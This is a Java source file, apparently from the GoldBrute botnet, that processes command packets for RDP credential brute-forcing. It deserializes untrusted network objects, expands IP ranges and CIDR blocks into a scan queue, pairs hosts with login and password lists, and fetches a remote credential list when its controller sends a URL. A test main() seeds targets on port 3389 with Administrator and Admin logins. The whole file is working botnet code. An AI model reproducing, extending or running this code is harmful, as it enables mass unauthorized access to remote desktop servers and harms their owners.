package rdp.gold.brute.synchronizer.packages.read;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;

import org.apache.log4j.Logger;

import rdp.gold.brute.Config;
import rdp.gold.brute.DownloadProjectsFilesClient;
import rdp.gold.brute.IPUtil;
import rdp.gold.brute.Registry;
import rdp.gold.brute.constant.BruteforceMode;
import rdp.gold.brute.db.FilesDB;
import rdp.gold.brute.pool.GoldBrute;
import rdp.gold.brute.synchronizer.SynchronizerInfo;
import rdp.gold.brute.synchronizer.packages.AbstractPackage;
import rdp.gold.brute.synchronizer.packages.ReadPackage;
import rdp.gold.brute.synchronizer.packages.write.BruteResultsPackage;

@SuppressWarnings({ "unchecked", "resource", "rawtypes" })
public class HostListPackage extends AbstractPackage implements ReadPackage {
    private final Logger logger = Logger.getLogger(getClass());

    public HostListPackage(SynchronizerInfo synchronizerInfoObject) {
        super(synchronizerInfoObject, "HostListPackage");
    }

    public void processPacket(byte[] packet) throws Exception {
        Map<String, Object> packetMap = parsePacket(packet);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream((byte[]) packetMap.get("PACKET")));
        Map<String, Object> hostList = (Map) objectInputStream.readObject();

        if (hostList.containsKey("H")) {
            Scanner scanner = new Scanner((String) hostList.get("H")).useDelimiter("\r\n");
            if (Config.TYPE_TASK.get() == 1) {
                while (scanner.hasNext()) {
                    String host = scanner.next();
                    List<String> ipList = new ArrayList();

                    Matcher matcherRange = Config.PATTERN_IS_RANGE.matcher(host);
                    Matcher matcherCidr = Config.PATTERN_IS_CIDR.matcher(host);
                    Matcher matcherIp = Config.PATTERN_IP_WITH_OR_WITHOUT_PORT.matcher(host);
                    if (matcherRange.find()) {
                        ipList = IPUtil.getIpList(matcherRange.group(1), matcherRange.group(2));
                    } else if (matcherCidr.find()) {
                        ipList = IPUtil.getIpList(host);
                    } else if (matcherIp.find()) {
                        ipList.add(host);
                    }
                    Collections.shuffle(ipList);
                    for (String ipItem : ipList) {
                        GoldBrute.getTaskScanQueue().add(ipItem);
                    }
                }
            }
            if (Config.TYPE_TASK.get() == 2) {
                while (scanner.hasNext()) {
                    String host = scanner.next();
                    this.logger.info(host);
                    addLoginPasswordHostListToQueue(host);
                }
            }
        } else if ((hostList.containsKey("IP_LOGIN_PASSWORD_LIST_URL")) && (!Registry.IS_RUN_PROCESS_LOAD_IP_LOGIN_PASSWORD_LIST)
                && (Registry.CNT_ATTEMPTS_DOWNLOAD_IP_LOGIN_PASSWORD_LIST.intValue() < Config.MAX_CNT_ATTEMPTS_DOWNLOAD_IP_LOGIN_PASSWORD_LIST.intValue())) {
            Registry.IP_LOGIN_PASSWORD_LIST_URL = (String) hostList.get("IP_LOGIN_PASSWORD_LIST_URL");
            Registry.IP_LOGIN_PASSWORD_LIST_FILE_CRS32 = (Long) hostList.get("IP_LOGIN_PASSWORD_LIST_FILE_CRS32");

            DownloadProjectsFilesClient.interruptDownload();

            DownloadProjectsFilesClient downloadProjectsFilesClient = new DownloadProjectsFilesClient();
            downloadProjectsFilesClient.start();
        } else {
            Thread.sleep(10000L);
        }
    }

    private void addLoginPasswordHostListToQueue(String loginPasswordHost) {
        try {
            Scanner scannerLoginPasswordHost = new Scanner(loginPasswordHost).useDelimiter(",");
            Integer nLoginPassword = Integer.valueOf(scannerLoginPasswordHost.nextInt());
            Scanner scannerHost = new Scanner(scannerLoginPasswordHost.next()).useDelimiter("-");

            Integer nHostStart = Integer.valueOf(scannerHost.nextInt());
            Integer nHostEnd = Integer.valueOf(scannerHost.nextInt());

            String loginPassword = null;
            if (Config.BRUTEFORCE_MODE == BruteforceMode.MODE_LOGIN_PASSWORD_LIST) {
                loginPassword = FilesDB.getLoginPasswordByNumber(nLoginPassword.intValue());
            } else if (Config.BRUTEFORCE_MODE == BruteforceMode.MODE_IP_LOGIN_LIST) {
                loginPassword = FilesDB.getPasswordByNumber(nLoginPassword.intValue());
            }
            List<String> hostList = FilesDB.getHostListByBetween(nHostStart.intValue(), nHostEnd.intValue());

            for (String host : hostList) {
                if (Config.BRUTEFORCE_MODE == BruteforceMode.MODE_IP_LOGIN_LIST) {
                    String[] hostSplit = host.split(";");

                    Scanner scannerLogins = new Scanner(hostSplit[1]).useDelimiter(",");
                    while (scannerLogins.hasNext()) {
                        String addToQueue = hostSplit[0] + ";" + scannerLogins.next().trim() + ";" + loginPassword;
                        GoldBrute.getTaskBruteQueue().add(addToQueue);

                        System.out.println(addToQueue);
                    }
                } else if (Config.BRUTEFORCE_MODE == BruteforceMode.MODE_LOGIN_PASSWORD_LIST) {
                    String addToQueue = host + ";" + loginPassword.replace(":", ";");
                    GoldBrute.getTaskBruteQueue().add(addToQueue);

                    System.out.println(addToQueue);
                }
            }
        } catch (Exception e) {
            this.logger.error(e);
            e.printStackTrace();
        }
    }

    public Class<?> getAwaitPackage() {
        return null;
    }

    public Class<?> getWritePackage() {
        return BruteResultsPackage.class;
    }

    public static void main(String[] argc) {
        Config.BRUTEFORCE_MODE = BruteforceMode.MODE_IP_LOGIN_LIST;

        List<String> ipList = new ArrayList();
        for (int i = 1; i <= 255; i++) {
            ipList.add("1.1.1." + i + ":3389;Administrator, Admin");
        }
        FilesDB.importIpList(ipList);

        List<String> loginPasswordList = new ArrayList();
        for (int i = 1; i <= 255; i++) {
            loginPasswordList.add("login-" + i + ":password-" + i);
        }
        FilesDB.importLoginPasswordList(loginPasswordList);

        List<String> passwordList = new ArrayList();
        for (int i = 1; i <= 255; i++) {
            passwordList.add("password-" + i);
        }
        FilesDB.importPasswordList(passwordList);

        HostListPackage hostListPackage = new HostListPackage(new SynchronizerInfo());
        hostListPackage.testRunAddLoginPasswordHostListToQueue("1,1-10");
    }

    public void testRunAddLoginPasswordHostListToQueue(String host) {
        addLoginPasswordHostListToQueue(host);
    }
}
